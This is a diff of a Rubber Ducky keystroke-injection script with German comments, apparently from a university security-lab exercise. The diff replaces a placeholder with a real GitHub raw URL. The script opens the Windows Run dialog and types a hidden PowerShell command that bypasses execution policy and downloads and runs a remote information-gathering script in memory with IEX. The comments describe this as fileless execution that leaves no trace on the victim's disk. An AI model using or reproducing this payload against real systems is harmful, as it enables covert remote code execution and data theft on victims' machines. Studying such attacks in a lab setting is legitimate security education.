@@ -3,16 +3,13 @@ REM  W02a.4 – Rubber Ducky: Externes Script laden & ausführen
 REM  Autoren: Raphael Bleier, Joachim Lugger
 REM  Ziel-OS: Windows
 REM
-REM  Lädt ein beliebiges PowerShell-Script direkt von einem
-REM  öffentlichen GitHub Gist – fileless, kein Server nötig.
-REM  Funktioniert über alle Subnetze (HTTPS zu github.com).
-REM
-REM  Setup: GIST_RAW_URL durch Raw-URL des eigenen Gists ersetzen
-REM  Beispiel: https://gist.githubusercontent.com/USER/ID/raw/script.ps1
+REM  Demonstriert fileless Execution: Script wird direkt von
+REM  GitHub in den Speicher geladen und ausgeführt (IEX).
+REM  Kein Byte landet auf der Festplatte des Opfers.
+REM  Hier: info_gather.ps1 als Beispiel-Payload.
 REM ============================================================
 
 DELAY 2000
-
 GUI r
 DELAY 500
-STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('GIST_RAW_URL');"
+STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/info_gather.ps1');"
